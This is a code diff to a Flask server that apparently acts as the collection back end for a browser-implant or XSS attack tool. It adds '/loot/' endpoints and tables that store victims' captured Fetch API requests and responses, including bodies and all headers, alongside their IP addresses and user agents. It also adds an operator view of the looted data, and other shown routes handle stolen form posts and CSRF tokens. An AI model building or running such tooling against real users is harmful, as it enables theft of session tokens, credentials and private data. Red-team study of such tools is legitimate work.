@@ -444,6 +444,38 @@ class XhrHeader(Base):
         return f'<XhrHeader {self.id}>'
 
 
+# For refactor
+class FetchApiCall(Base):
+    __tablename__ = 'fetchapicall'
+
+    id             = Column(Integer, primary_key=True)
+    clientID       = Column(String(100), nullable=False)
+    method         = Column(String(100), nullable=False)
+    url            = Column(Text, nullable=False)
+    requestBody    = Column(Text, nullable=True)
+    responseBody   = Column(Text, nullable=True)
+    responseStatus = Column(Integer, nullable=True)
+    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<FetchApiCall {self.id}>'
+
+
+# For refactor
+class FetchHeader(Base):
+    __tablename__ = 'fetchheader'
+
+    id        = Column(Integer, primary_key=True)
+    apiCallID = Column(Integer, nullable=False)
+    clientID  = Column(String(100), nullable=False)
+    header    = Column(Text, nullable=False)
+    value     = Column(Text, nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<FetchHeader {self.id}>'
+
+
 
 
 class FetchSetup(Base):
@@ -459,8 +491,8 @@ class FetchSetup(Base):
         return f'<FetchSetup {self.id}>'
 
 
-class FetchHeader(Base):
-    __tablename__ = 'fetchheader'
+class FetchSetHeader(Base):
+    __tablename__ = 'fetchsetheader'
 
     id        = Column(Integer, primary_key=True)
     clientID  = Column(String(100), nullable=False)
@@ -469,7 +501,7 @@ class FetchHeader(Base):
     timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<FetchHeader {self.id}>'
+        return f'<FetchSetHeader {self.id}>'
 
 
 class FetchCall(Base):
@@ -848,8 +880,10 @@ try:
                     XhrCall.__table__.drop(engine)
                     XhrApiCall.__table__.drop(engine)
                     XhrHeader.__table__.drop(engine)
-                    FetchSetup.__table__.drop(engine)
+                    FetchApiCall.__table__.drop(engine)
                     FetchHeader.__table__.drop(engine)
+                    FetchSetup.__table__.drop(engine)
+                    FetchSetHeader.__table__.drop(engine)
                     FetchCall.__table__.drop(engine)
                     Event.__table__.drop(engine)
                     FormPost.__table__.drop(engine)
@@ -1599,6 +1633,51 @@ def recordXhrDump(identifier):
 
 
 
+# Dump the full Fetch api call info
+@app.route('/loot/fetchRequestDump/<identifier>', methods=['POST'])
+def recordFetchDump(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    print("Got Fetch dump: ")
+    print(request.json)
+
+    content        = request.json
+    method         = content.get('method')
+    url            = content.get('url')
+    requestBody    = content.get('body')
+    headers        = content.get('headers', {})
+    responseBody   = content.get('responseBody')
+    responseStatus = content.get('responseStatus')
+
+    newFetchApiCall = FetchApiCall(clientID=identifier, method=method, url=url, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
+    db_session.add(newFetchApiCall)
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newFetchApiCall)
+    newEvent  = Event(clientID=identifier, timeStamp=newFetchApiCall.timeStamp, 
+    eventType ='FETCHAPICALL', eventID=newFetchApiCall.id)
+    db_session.add(newEvent)
+
+    for header, value in headers.items():
+        newHeader = FetchHeader(apiCallID=newFetchApiCall.id, clientID=identifier, header=header, value=value)
+        db_session.add(newHeader)
+
+    dbCommit()    
+
+    return "ok", 200   
+
+
+
+
 
 # Record Fetch API Setup
 @app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
@@ -1647,7 +1726,7 @@ def recordFetchHeader(identifier):
     value   = content['value']
 
     # Put it in the database
-    newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
+    newFetchHeader = FetchSetHeader(clientID=identifier, header=header, value=value)
     db_session.add(newFetchHeader)
 
     if (proxyMode):
@@ -1955,8 +2034,8 @@ def getClientXhrApiCall(key):
 
     headers_list = [{'header': header.header, 'value': header.value} for header in xhrHeaders]
 
-    for header in headers_list:
-        print(f"---------Header: {header['header']}, Value: {header['value']}")
+    # for header in headers_list:
+    #     print(f"---------Header: {header['header']}, Value: {header['value']}")
 
 
     xhrCallData = {
@@ -1972,6 +2051,34 @@ def getClientXhrApiCall(key):
     }
 
     return jsonify(xhrCallData)
+
+
+
+
+
+@app.route('/api/clientFetchApiCall/<key>', methods=['GET'])
+@login_required
+def getClientFetchApiCall(key):
+    fetchApiCall = FetchApiCall.query.filter_by(id=key).first()
+    fetchHeaders = FetchHeader.query.filter_by(apiCallID=key).all()
+
+    headers_list = [{'header': header.header, 'value': header.value} for header in fetchHeaders]
+
+    # for header in headers_list:
+    #     print(f"---------Header: {header['header']}, Value: {header['value']}")
+
+
+    fetchCallData = {
+        'method': escape(fetchApiCall.method),
+        'url': escape(fetchApiCall.url),
+        'requestBody': fetchApiCall.requestBody, # escape client side after b64 decode
+        'responseBody': fetchApiCall.responseBody, # escape client side after b64 decode
+        'responseStatus': escape(fetchApiCall.responseStatus),
+        'headers': headers_list
+    }
+
+    return jsonify(fetchCallData)
+
 
 
 
@@ -1993,7 +2100,7 @@ def getClientFetchSetup(key):
 @login_required
 def getClientFetchHeader(key):
     # logger.info("**** Fetching client fetch api header call...")
-    fetchHeader = FetchHeader.query.filter_by(id=key).first()
+    fetchHeader = FetchSetHeader.query.filter_by(id=key).first()
 
     fetchHeaderData = {'header':escape(fetchHeader.header), 'value':escape(fetchHeader.value)}
 
@@ -2032,8 +2139,6 @@ def searchCsrfToken(key):
     content    = request.json
     tokenName  = content['tokenName']
     tokenValue = content['tokenValue']
-
-    print("!!!!!!! Searching for: " + tokenName + ":" + tokenValue)
 
     formPost = FormPost.query.filter_by(id=key).first()
 
